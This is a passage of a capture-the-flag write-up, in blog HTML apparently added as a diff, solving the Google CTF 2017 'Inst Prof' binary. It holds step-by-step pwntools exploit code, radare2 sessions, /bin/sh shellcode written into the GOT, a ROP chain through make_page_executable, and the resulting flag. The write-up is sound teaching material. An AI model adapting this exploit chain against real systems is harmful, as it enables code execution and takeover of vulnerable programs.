+<span class="c1"># This way we are going to store 0x20 * 0x1000 (0x20000) in r15.</span>
+
+<span class="c1"># We send 0x10 times the next instruction.</span>
+<span class="c1"># Each of this sends will not be executed 0x1000 times because we are adding a `ret` opcode.</span>
+<span class="n">inst</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;add r14, r15&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x10</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>       <span class="c1"># &quot;\x4d\x01\xfe&quot; + &quot;\x3c&quot;; r14 = 0x200000</span>
+<span class="c1"># It has a ret instrucction attached so it will only going to get executed once each sending.</span>
+<span class="c1"># r14 has a initial value of 0x0 so adding to 0x0 0x10 times 0x20000 will result in 0x200000!</span>
+
+<span class="c1"># r10 is initially 0x487. If we add it 0x9D times to r14 we get ...</span>
+<span class="n">inst</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;add r14, r10&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>            <span class="c1"># &quot;\x4d\x01\xd6&quot; + &quot;\x3c&quot;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x9D</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>                            <span class="c1"># r14 = 0x2014da ! We are pretty close</span>
+
+<span class="c1"># We only need an extra 0xE so ...</span>
+<span class="n">inst</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;inc r14&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>                 <span class="c1"># &quot;\x49\xff\xc6&quot; + &quot;\xc3&quot;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xE</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>                            <span class="c1"># r14 = 0x2014e8 !!</span>
+
+<span class="c1"># Ta-dahhh! Now we add r13 (which have [rsp])  and ... </span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;add r13, r14&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>           <span class="c1"># &quot;\x4d\x01\xf5&quot; + &quot;\xc3&quot;; </span>
+<span class="c1"># r13 = r13 + 0x2014e8 = GOT TABLE !! </span>
+</code></pre></div>
+
+<p>Obviously, there is some data at the beginning of the GOT section. We should avoid overwritting it. That&rsquo;s the
+reason of the following lines.</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="c1"># We make a copy of the initial address of the GOT in r14</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r14, r13&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>           <span class="c1"># &quot;\x4d\x89\xee&quot; + &quot;\xc3&quot;;</span>
+
+<span class="c1"># We add 0x80 to r14 to point aheader, not the values we do not want to overwrite.</span>
+<span class="n">inst</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;inc r14&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>                 <span class="c1"># &quot;\x49\xff\xc6&quot; + &quot;\xc3&quot;; </span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x80</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>
+
+<span class="c1"># Copy of the address + 0x80 to r15.</span>
+<span class="c1"># We will need this copy to use it as an iterator to copy each byte of the shellcode into memory.</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r15, r14&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>           <span class="c1"># &quot;\x4d\x89\xf7&quot; + &quot;\xc3&quot;;</span>
+</code></pre></div>
+
+<p>Dont get lost. Briefly, when the execution of this script reach this point, the value of <code>r13</code>, <code>r14</code> and <code>r15</code>
+is going to be:</p>
+
+<ol>
+<li><p><code>r13</code> = Beginning of GOT</p></li>
+
+<li><p><code>r14</code> = GOT + 0x80 = Start address of our shellcode</p></li>
+
+<li><p><code>r15</code> = GOT + 0x80 = Start address of our shellcode</p></li>
+</ol>
+
+<blockquote>
+<p>mmmh repeat me again, why <code>r14</code> and <code>r15</code> has the same value?
+It is just because we will increment <code>r15</code> one by one and use it to write each byte of the shellcode but we
+will still need to know its initial value to say: &ldquo;Hey you! start executing instructions at this point please&rdquo;.</p>
+</blockquote>
+
+<p>At this point we want to write the entire shellcode at a register (<code>r14</code> or <code>r15</code>) incrementing it by one each time one of the bytes of the shellcode is stored.</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="k">def</span> <span class="nf">writeByteString</span><span class="p">(</span><span class="nb">str</span><span class="p">):</span>
+    <span class="n">mov_r15</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x41\xc6\x07</span><span class="s2">&quot;</span>                <span class="c1"># mov byte ptr [r15], {byte}</span>
+    <span class="n">inc_r15</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;inc r15&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>          <span class="c1"># &quot;\x49\xff\xc7&quot; + &quot;\xc3&quot;</span>
+    
+    <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">mov_r15</span> <span class="o">+</span> <span class="n">byte</span><span class="p">)</span>              
+        <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inc_r15</span><span class="p">)</span>                     <span class="c1"># inc r15    </span>
+</code></pre></div>
+
+<p>When we execute that function with the shellcode as argument the registers will be as follows:</p>
+
+<ol>
+<li><p><code>r13</code> = Beginning of GOT</p></li>
+
+<li><p><code>r14</code> = GOT + 0x80 = Start address of our shellcode</p></li>
+
+<li><p><code>r15</code> = GOT + 0x80 + 0x23 = End address of our shellcode</p></li>
+</ol>
+
+<p>Lets check all this code and show the memory of the process with r2 to ensure that our shellcode is there.
+<a href="/assets/GoogleCTF2017/Inst Prof/solve1.py">solve1.py</a>.</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ ./solve1.py
+<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./inst_prof&#39;</span>: pid <span class="m">17632</span>
+initializing prof...ready
+</code></pre></div>
+
+<p>Once the script is initiated we open a new terminal, attach radare2 to the process and check if our shellcode has
+been inserted correctly.
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>$ r2 -d 21370
+[<span class="mh">0x7f5ac270fa61</span>]<span class="o">&gt;</span> <span class="nf">pxq</span> @ section..got.plt 
+<span class="s">0x55aaeef73000</span>  <span class="mh">0x0000000000201e08  0x00007f5ac2c06100 </span>  .. ......a..Z...
+<span class="s">0x55aaeef73010</span>  <span class="mh">0x00007f5ac29f5db0  0x00007f5ac270faf0 </span>  .]..Z.....p.Z...
+<span class="s">0x55aaeef73020</span>  <span class="mh">0x00007f5ac2719050  0x000055aaeed717d6 </span>  P.q.Z........U..
+<span class="s">0x55aaeef73030</span>  <span class="mh">0x00007f5ac270fa50  0x00007f5ac2648e80 </span>  P.p.Z.....d.Z...
+<span class="s">0x55aaeef73040</span>  <span class="mh">0x000055aaeed71806  0x00007f5ac2719140 </span>  .....U..@.q.Z...
+<span class="s">0x55aaeef73050</span>  <span class="mh">0x00007f5ac2719170  0x000055aaeed71836 </span>  p.q.Z...6....U..
+<span class="s">0x55aaeef73060</span>  <span class="mh">0x000055aaeed71846  0x000055aaeed71856 </span>  F....U..V....U..
+<span class="s">0x55aaeef73070</span>  <span class="mh">0x0000000000000000  0x000055aaeef73078 </span>  ........x0...U..
+<span class="hll"><span class="s">0x55aaeef73080</span>  <span class="mh">0x69622fbb48993bb0  0x54535268732f2f6e </span>  .;.H./bin//shRST
+</span><span class="hll"><span class="s">0x55aaeef73090</span>  <span class="mh">0x00050f5e5457525f  0x0000000000000000 </span>  _RWT^...........
+</span><span class="s">0x55aaeef730a0</span>  <span class="mh">0x0000000000000000  0x0000000000000000 </span>  ................
+<span class="s">0x55aaeef730b0</span>  <span class="mh">0x0000000000000000  0x0000000000000000 </span>  ................
+<span class="s">0x55aaeef730c0</span>  <span class="mh">0x0000000000000000  0x0000000000000000 </span>  ................
+<span class="s">0x55aaeef730d0</span>  <span class="mh">0x0000000000000000  0x0000000000000000 </span>  ................
+<span class="s">0x55aaeef730e0</span>  <span class="mh">0x0000000000000000  0x0000000000000000 </span>  ................
+<span class="s">0x55aaeef730f0</span>  <span class="mh">0x0000000000000000  0x0000000000000000 </span>  ................
+</code></pre></div>
+</p>
+
+<p>Nice! the shellcode is inserted.<br />
+Now we only need to make that memory zone executable and redirect the flow to <code>r14</code>, where our shellcode lives on.</p>
+
+<hr />
+
+<h4 id="make-a-page-executable-is-that-even-possible">Make a page executable? Is that even possible?</h4>
+
+<p>Well, normally is a bit more complicated than here. Thankfully, we have a function called <code>sym.make_page_executable()</code> which receives an 0x1000-aligned address.</p>
+
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x7f8137df2a61</span>]<span class="o">&gt;</span> <span class="nf">aaa</span>;afl~make
+<span class="hll"><span class="s">0x55c877154a20</span><span class="mh">    1 20           </span>sym.make_page_executable
+</span></code></pre></div>
+
+
+<p>Again, we need to calculate this address at runtime since it will change on every execution.<br />
+We will calculate the difference between <code>sym.make_page_executable()</code> and <code>[rsp]</code>, just like we did
+previously with the <code>GOT</code>.</p>
+
+<p>Once we have calculated this second the address, we will insert it on a specific position of the stack to redirect
+the flow. Remember that <code>sym.make_page_executable()</code> needs a 0x1000-aligned address. We will use the address of the
+<code>GOT</code> which is always aligned to that number. Look:</p>
+
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>[<span class="mh">0x7f8137df2a61</span>]<span class="o">&gt;</span> <span class="nf">dr</span>~r1
+r<span class="mh">10</span> <span class="o">=</span> <span class="mh">0x00000022</span>
+r<span class="mh">11</span> <span class="o">=</span> <span class="mh">0x00000246</span>
+r<span class="mh">12</span> <span class="o">=</span> <span class="mh">0x7f81382e6009</span>
+<span class="hll">r<span class="mh">13</span> <span class="o">=</span> <span class="mh">0x55c877356000</span>
+</span>r<span class="mh">14</span> <span class="o">=</span> <span class="mh">0x55c877356080</span>
+r<span class="mh">15</span> <span class="o">=</span> <span class="mh">0x55c877356097</span>
+</code></pre></div>
+
+
+<p>We want to send the address stored in <code>r13</code>. As we see in the <a href="../inst_prof_p1">first part 1</a> the calling
+convention for a 64 bit arquitecture states that:</p>
+
+<blockquote>
+<p>The first six arguments [of a function] are passed in registers <strong>RDI</strong>, <strong>RSI</strong>, <strong>RDX</strong>, <strong>RCX</strong>, <strong>R8</strong>, and
+<strong>R9</strong>.</p>
+
+<p>the return value is stored in <strong>RAX</strong> and <strong>RDX</strong>.</p>
+</blockquote>
+
+<p>Then we need to move <code>r13</code> to <code>RDI</code>. Something like:</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&quot;mov rdi, r13&quot;</span><span class="p">))</span>
+</code></pre></div>
+
+<p>The instruction only has a 3-bytes opcode</p>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span></span>$ rasm2 -a x86 -c <span class="m">64</span> <span class="s1">&#39;mov rdi, r13&#39;</span>
+4c89ef
+</code></pre></div>
+
+<p>The problem is that we need an iteration in the loop to do that, <strong>BUT</strong> <code>RDI</code> will be overwritten by the time
+we get to the second iteration. What could we do then?</p>
+
+<p>The answer is <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a>.<br />
+Basically we are going to re-use existent instructions of the process to alter the <code>RDI</code> value, jump from there
+to <code>sym.make_page_executable()</code> and from there to our shellcode. The instruction - or how they are called: ROP
+Gadget - we are going to re-use is:</p>
+<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span></span><span class="nf">pop</span> <span class="no">rdi</span>
+<span class="nf">ret</span>
+</code></pre></div>
+
+<p>We have to find out the address of that gadget, write its address in the stack overwritting the current return
+address of the current stack frame and right after it, push the value we want to store</p>
+
+<p>How do we find the address of the ROP gadget? Luckily, r2 has a very handful command to accomplish this task.</p>
+
+<p><div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>$ r2 -Ad -c &#39;s main; &quot;/R pop rdi;ret&quot;&#39; -d inst_prof
+<span class="s">0x55f78b7bdbc3</span>  <span class="mh">               5f  pop rdi</span>
+<span class="mh">0x55f78b7bdbc4      </span>           c3  ret
+</code></pre></div>
+
+&gt; <code>-Ad</code>: we already know that <code>A</code> stands for <code>Analyze</code> and <code>d</code> is for open for debugging.</p>
+
+<blockquote>
+<p><code>-c</code> just passes the commands directly to r2. We want to positioned ourselves in the <code>main</code> function (<code>s 
+main</code>) and search for our desired gadget <code>&quot;/R pop rdi;ret&quot;</code>.</p>
+</blockquote>
+
+<p>Ok! so there we will have to write the following data in the stack:</p>
+
+<div class="highlight compact text-center"><pre><code class="language-sh" data-lang="sh"><span></span>------------------------------------------------------------------------
+address of the ROP gadget
+------------------------------------------------------------------------
+value we want to send to make_page_executable
+which is the address of the GOT   
+------------------------------------------------------------------------
+address of make_page_executable
+------------------------------------------------------------------------
+</code></pre></div>
+
+
+<p>Wee can write these wherever we want to into the stack, just have in mind they need to survive to several calls
+of <code>sym.do_test()</code>. I decided to use the following addresses:</p>
+
+<div class="highlight compact"><pre><code class="language-sh" data-lang="sh"><span></span>----------------------------------------------------------------------
+ rsp + <span class="m">24</span>  │              address of the ROP gadget             │ 
+----------------------------------------------------------------------
+ rsp + <span class="m">32</span>  │    value we want to send to make_page_executable   │ r13
+           │         which is the address of the GOT            │ 
+----------------------------------------------------------------------
+ rsp + <span class="m">40</span>  │           address of make_page_executable          │ 
+----------------------------------------------------------------------
+</code></pre></div>
+
+
+<p>Once again, remember that we need to calculate the addresses on-runtime. Not the threer of them, but two because
+we already have address of the GOT in <code>r13</code>. <code>r14</code> is not shown in the previous schema but it will be used in
+a latter phase.</p>
+
+<p>We only have <code>r15</code> free, so we are going to save <code>r13</code> in <code>rsp + 32</code> at first place to be able to use it too.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="c1"># 1) rsp + 32 -&gt; GOT table address (r13)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r15, rsp&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>        <span class="c1"># &quot;\x49\x89\xe7&quot; + ret</span>
+
+<span class="n">inst</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;inc r15&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>              <span class="c1"># &quot;\x49\xff\xc7&quot; + ret</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>
+<span class="hll"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov [r15], r13&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>      <span class="c1"># \x4d\x89\x2f + ret</span>
+</span><span class="hll"><span class="c1"># :&gt; pxq 8 @ rsp+32</span>
+</span><span class="hll"><span class="c1"># 0x7ffde1355c48  0x000055664a259000                       ..%JfU..</span>
+</span></code></pre></div>
+
+
+<p>All right, lets go with the address of <code>sym.make_page_executable()</code> at <code>rsp + 40</code></p>
+
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>$ r2 -Ad -R &quot;stdin=\&quot;`python -c &#39;print(\&quot;\xc3\&quot; * 8)&#39;`\&quot;&quot; -c &#39;dcu main; db `/a call rbx~[0]`; dc; ds 2&#39; inst_prof
+[<span class="mh">0x7fbf976e6005</span>]<span class="o">&gt;</span> ? sym.make_page_executable - [rsp]
+-<span class="mh">248</span> <span class="mh">0xffffffffffffff08</span> <span class="mh">01777777777777777777410</span> <span class="mh">17179869184</span><span class="o">.</span><span class="mh">0</span>G fffff<span class="mh">000</span><span class="o">:</span><span class="mh">0f08</span> <span class="o">-</span><span class="mh">248</span> 
+&quot;<span class="err">\</span>b<span class="err">\</span>xff<span class="err">\</span>xff<span class="err">\</span>xff<span class="err">\</span>xff<span class="err">\</span>xff<span class="err">\</span>xff<span class="err">\</span>xff<span class="err">&quot;</span> <span class="mh">1111111111111111111111111111111111111111111111111111111100001000</span> <span class="o">-</span><span class="mh">248</span><span class="o">.</span><span class="mh">0</span> 
+-<span class="mh">248</span><span class="o">.</span><span class="mh">000000f</span> <span class="o">-</span><span class="mh">248</span><span class="o">.</span><span class="mh">000000</span>
+</code></pre></div>
+
+
+<p>All right, so it seems that <code>sym.make_page_executable() = [rsp] - 248</code></p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="c1"># 2) rsp + 40 -&gt; addr make executable</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r13, [rsp]&#39;</span><span class="p">))</span>               <span class="c1"># &quot;\x4c\x8b\x2c\x24&quot;</span>
+<span class="n">inst</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;dec r13&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">248</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>                            <span class="c1"># &quot;\x49\xff\xcd&quot; + ret</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r15, rsp&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>           <span class="c1"># &quot;\x49\x89\xe7&quot; + ret</span>
+<span class="n">inst</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;inc r15&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">40</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>                            <span class="c1"># &quot;\x49\xff\xc7&quot; + ret</span>
+<span class="hll"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov [r15], r13&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>         <span class="c1"># &quot;\x4d\x89\x2f&quot; + ret</span>
+</span><span class="hll"><span class="c1"># :&gt; pxq 8 @ rsp+24</span>
+</span><span class="hll"><span class="c1"># 0x7ffde1355c40  0x000055664a057a20                        z.JfU..</span>
+</span></code></pre></div>
+
+
+<p><code>rsp + 32</code> .. <code>rsp + 40</code> .. and now we go for <code>rsp + 24</code>. We have to write there the address of the ROP
+gadget. Lets calculate the distance.</p>
+
+<div class="highlight"><pre><code class="language-r2" data-lang="r2"><span></span>$ r2 -Ad -R &quot;stdin=\&quot;`python -c &#39;print(\&quot;\xc3\&quot; * 8)&#39;`\&quot;&quot; -c &#39;dcu main; db `/a call rbx~[0]`;&#39; inst_prof
+[<span class="mh">0x5590dcff1860</span>]<span class="o">&gt;</span> <span class="nf">dc</span>
+initializing prof<span class="o">...</span>ready
+hit breakpoint at<span class="o">:</span> <span class="mh">5590dcff1b16</span>
+[<span class="mh">0x5590dcff1b16</span>]<span class="o">&gt;</span> <span class="nf">ds</span> 2
+[<span class="mh">0x7fd31ab7f005</span>]<span class="o">&gt;</span> ? 0x5590dcff1bc3 - [rsp]
+<span class="hll">1<span class="mh">71</span> <span class="mh">0xab</span> <span class="mh">0253</span> <span class="mh">171</span> <span class="mh">0000</span><span class="o">:</span><span class="mh">00ab</span> <span class="mh">171</span> <span class="err">&quot;\</span>xab<span class="err">&quot;</span> <span class="mh">10101011</span> <span class="mh">171</span><span class="o">.</span><span class="mh">0</span> <span class="mh">171</span><span class="o">.</span><span class="mh">000000f</span> <span class="mh">171</span><span class="o">.</span><span class="mh">000000</span>
+</span></code></pre></div>
+
+
+<p>The ROP gadget is <code>0xab</code> bytes away from <code>[rsp]</code>, or the return address.</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="c1"># 3) rsp + 24 -&gt; ROP pop rdi + ret</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r13, [rsp]&#39;</span><span class="p">))</span>              <span class="c1"># &quot;\x4c\x8b\x2c\x24&quot;</span>
+<span class="n">inst</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;inc r13&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0xab</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>                           <span class="c1"># &quot;\x49\xff\xc5&quot; + ret</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r15, rsp&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>          <span class="c1"># &quot;\x49\x89\xe7&quot; + ret</span>
+<span class="n">inst</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;inc r15&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>                           <span class="c1"># &quot;\x49\xff\xc7&quot; + ret</span>
+<span class="hll"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov [r15], r13&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>        <span class="c1"># &quot;\x4d\x89\x2f&quot; + ret</span>
+</span><span class="c1"># :&gt; pxq 8 @ rsp+24</span>
+<span class="c1"># 0x7ffe34edf120  0x0000562f517c0bc3                       ..|Q/V..</span>
+</code></pre></div>
+
+
+<p>At this point we only have to do a few more things.<br />
+First, we set the <code>return address</code> to the address of our <code>ROP gadget</code>, just to redirect the flow of the program
+after end the current function. Something like <code>rsp = rsp + 24</code>.</p>
+
+<p>Lets calculate <code>r15 = rsp + 24</code>.
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov r15, rsp&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>        <span class="c1"># &quot;\x49\x89\xe7&quot; + ret</span>
+<span class="n">inst</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;inc r15&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">inst</span><span class="p">)</span>                         <span class="c1"># &quot;\x49\xff\xc7&quot; + ret</span>
+</code></pre></div>
+</p>
+
+<p>And once it is calculated, we use it to update the value of <code>rsp</code>:
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov rsp, r15&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>        <span class="c1"># &quot;\x4c\x89\xfc&quot; + ret</span>
+</code></pre></div>
+</p>
+
+<p>And finally we only need to redirect the flow to our shellcode!
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span></span><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;mov [rsp], r14&#39;</span><span class="p">))</span>            <span class="c1"># &quot;\x4c\x89\x34\x24&quot;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+</p>
+
+<p><a href="/assets/GoogleCTF2017/Inst Prof/solve2.py">solve2.py</a>.</p>
+
+<p>Answer: CTF{0v3r_4ND_0v3r_4ND_0v3r_4ND_0v3r}</p>
+
+<h3 id="video">Video</h3>
+
+<p><a href="https://asciinema.org/a/R71WGFkZWEyonqfK5DLf0l5UN?autoplay=1">
+  <img src="https://asciinema.org/a/R71WGFkZWEyonqfK5DLf0l5UN.png"/>
+</a></p>
+
+<h3 id="references-and-tools-used">References and tools used:</h3>
+
+<ul>
+<li><a href="https://github.com/radare/radare2">radare2</a> - To analyze the binary.</li>
+<li><a href="https://asciinema.org">asciinema</a> - To record the session.</li>
+<li><a href="https://binarystud.io/googlectf-2017-inst-prof-152-final-value.html">BinaryStud.io</a> - Another solution using r2!</li>
+<li><a href="https://www.python.org/">python</a> and <a href="https://github.com/Gallopsled/pwntools">pwntools</a> - To code the
+exploitation phase.</li>
+<li><a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a> - Shellcode explanation.</li>
+<li><a href="https://en.wikipedia.org/wiki/Global_Offset_Table">GOT</a> - Global Offset Table explanation.</li>
+<li><a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a> - Return Oriented Programming.</li>
+</ul>
+
+                    </div>
+                    <div class="hmdl-page-comments mdl-color-text--primary-contrast mdl-card__supporting-text comments"> 
+                        <strong>
+                            	<strong>Tzaoh</strong>
+						</strong>
+                        <p></p>
+                    </div>  
+                </div>                
+                <nav class="mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+                    <a href="/post/googlectf2017/inst_prof_p1/">
+                        <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                        <i class="icon ion-android-arrow-back"></i>
+                        </button>
+                        Older
+                    </a>
+                    <div class="section-spacer"></div>
+                </nav>
+ 
+            </div>        
+        </main>
+        <footer class="mdl-mini-footer">
+            <div class="mdl-mini-footer--left-section">                
+                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="mailto:pwn4tion@gmail.com?subject=Hi">
+                    <i class="material-icons_lg icon ion-email"></i>
+                    <span class="visuallyhidden">Email</span>
+                </a>
+                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://github.com/Pwnation">
+                    <i class="material-icons_lg icon ion-social-github"></i>
+                    <span class="visuallyhidden">Github</span>
+                </a>
+                <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-mini-footer--social-btn social-btn" href="https://twitter.com/PwnationBlog">
+                    <i class="material-icons_lg icon ion-social-twitter "></i>
+                    <span class="visuallyhidden">Twitter</span>
+                </a>
+
+
+            </div>
+            <div class="mdl-mini-footer--right-section">
+                <span>© 2017 </span>
+            </div>
+        </footer>
+        <div class="mdl-layout__obfuscator"></div>
+    </div>
+    <script src="https://code.getmdl.io/1.1.3/material.min.js"></script>
+
+
+</body>
+</html>
+
